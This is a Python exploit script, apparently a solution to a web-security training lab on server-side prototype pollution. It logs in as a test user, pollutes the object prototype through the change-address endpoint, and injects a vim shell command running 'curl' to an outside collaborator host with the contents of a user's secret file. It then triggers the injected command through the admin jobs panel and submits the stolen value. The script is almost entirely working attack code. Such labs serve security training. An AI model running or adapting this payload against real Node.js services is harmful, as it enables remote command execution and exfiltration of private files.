# Exfiltrating sensitive data via server-side prototype pollution

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_wiener(s, url):
	print('\n[+] Trying to log in as Wiener...')
	account_path = url + '/my-account'
	login_path = url + '/login'
	r = s.get(account_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	login_data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
	r = s.post(login_path, json=login_data)
	time.sleep(1)
	return r

def pollute(s, url, collab):
	print('\n[+] Trying to find prototype pollution vector...')
	js_file_path = url + '/resources/js/updateAddress.js'
	change_address_path = url + '/my-account/change-address'
	js_content = s.get(js_file_path).text
	time.sleep(1)
	print('---------------------------------------------')
	print(js_content)
	print('---------------------------------------------')
	print('\n[+] Trying to set "json spaces" to 42...\n')
	session = s.cookies['session']
	payload = f"""{{"sessionId":"{session}","__proto__" :{{"json spaces": 42}}}}"""
	print('[+] Sending payload:')
	print(payload)
	r = s.post(change_address_path, data=payload)
	time.sleep(1)
	print('[+] Server response:')
	print(r.text)
	print('---------------------------------------------')
	if '"json spaces": 42' in r.text:
		payload = f"""{{"sessionId":"{session}","__proto__" :{{"shell":"vim","input":":! curl -v https://{collab}?$(cat /home/carlos/secret)\\n"}}}}"""
		print('[+] Sending payload:')
		print(payload)
		r = s.post(change_address_path, data=payload)
		time.sleep(1)
		print('[+] Server response:')
		response = r.text.replace('\\"', '"')
		print(response)
		if r.status_code != 500:
			return True
	return False

def get_secret(r):
	secret = re.search(r'n> GET /\?(.*) HTTP/1.1\\r\\n', r).group(1)
	return secret.strip()

def trigger_payload(s, url):
	print('[+] Trying to trigger the payload running maintenance tasks on Admin panel...')
	run_tasks_path = url + '/admin/jobs'
	admin_path = url + '/admin'
	r = s.get(admin_path)
	csrf_token = get_csrf_token(r)
	session = s.cookies['session']
	payload = f"""{{"csrf":"{csrf_token}","sessionId":"{session}","tasks":["db-cleanup","fs-cleanup"]}}"""
	r = s.post(run_tasks_path, data=payload)
	print('[+] Server response:')
	time.sleep(1)
	response = r.text.replace('\\"', '"')
	print(response)
	if r.status_code != 500:
		return response

def submit_secret(s, url, secret):
	print('\n[+] Trying to submit the Secret to solve the lab...')
	submit_path = url + '/submitSolution'
	submit_data = {"answer": secret}
	r = s.post(submit_path, data=submit_data)
	return r

def reset_web_app(s, url):
	print('[+] Reseting the Web Application...')
	reset_path = url + '/node-app/restart'
	r = s.get(reset_path)
	time.sleep(9)
	return r

def show_usage():
	print('[+] Usage: %s <URL>\n' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Exfiltrating sensitive data via server-side prototype pollution')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	collab = 'abcdefghijklmnopqrstuvwxyz.oastify.com'
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			reset_web_app(s, url)
			print("\n[+] Trying to find a way to retrieve Carlos secret file in his /home dir...")
			r = connect_as_wiener(s, url)
			if pollute(s, url, collab):
				time.sleep(2)
				r = trigger_payload(s, url)
				s.cookies.clear()
				secret = get_secret(r)
				time.sleep(2)
				r = submit_secret(s, url, secret)
				time.sleep(2)
				print(r.text)
				# print(re.search(r'"correct":(.*)}', r.text).group(1))
				time.sleep(2)
				r = s.get(url)
				if 'Congratulations, you solved the lab!' in r.text:
					print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('\n[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
